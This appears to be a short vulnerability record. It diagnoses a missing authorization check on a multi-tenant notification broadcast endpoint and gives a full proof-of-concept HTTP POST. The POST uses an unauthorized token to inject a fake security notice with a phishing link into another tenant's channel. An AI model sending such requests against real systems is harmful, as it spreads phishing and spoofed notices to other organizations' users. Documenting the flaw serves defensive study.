diagnosis: The broadcast dispatcher takes channel_name directly from the URL path and publishes the message to Redis channel events:{channel_name} without checking if current_user has administrative broadcast permissions on that channel. An attacker can publish fraudulent emergency notices, phishing links, or spoofed operational commands into other tenants' private notification channels.
exploit_request:
POST /notifications/channels/tenant_acme_corp/broadcast HTTP/1.1
Host: notify.saas.io
Authorization: Bearer <unauthorized_user_token>
Content-Type: application/json

{"title": "Critical Security Notice", "body": "Please reset your credentials at http://attacker-phish.com"}
